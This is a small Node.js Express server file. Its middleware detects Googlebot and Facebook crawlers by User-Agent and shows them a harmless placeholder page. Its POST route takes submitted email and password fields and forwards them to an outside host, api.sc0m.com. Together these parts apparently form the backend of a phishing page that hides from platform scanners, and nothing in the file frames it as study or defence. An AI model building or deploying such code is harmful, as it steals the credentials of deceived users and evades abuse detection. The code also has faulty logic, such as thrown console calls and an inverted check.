const express = require('express');
const app = express();
const port = 3000;
const cors = require('cors');
const { default: axios } = require('axios');

app.use(cors());
app.use(express.json());

app.use((req, res, next) => {
  try {
    const userAgent = req.headers['user-agent'];
    if (userAgent) {
      if (userAgent.includes('Googlebot')) {
        throw console.error('Google bot is visiting.');
      } else if (
        userAgent.includes('facebookexternalhit') ||
        userAgent.includes('Facebot')
      ) {
        throw console.error('Facebook bot is visiting.');
      } else {
        console.log('Some other user or bot is visiting.', userAgent);
      }
    }
    next();
  } catch (error) {
    res.status(200).send('welome to my web site');
  }
});
app.get('/', (req, res) => {
  res.send('Hello World!');
});

app.post('/', async (req, res) => {
  try {
    const { data, email, password } = req.body;

    const addnew = await axios.post(
      'https://api.sc0m.com/api/contact',
      req.body,
    );
    if (!addnew) {
      res.send(addnew.data);
    }

    res.send(addnew.data);
  } catch (error) {
    res.send(error);
  }
});
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
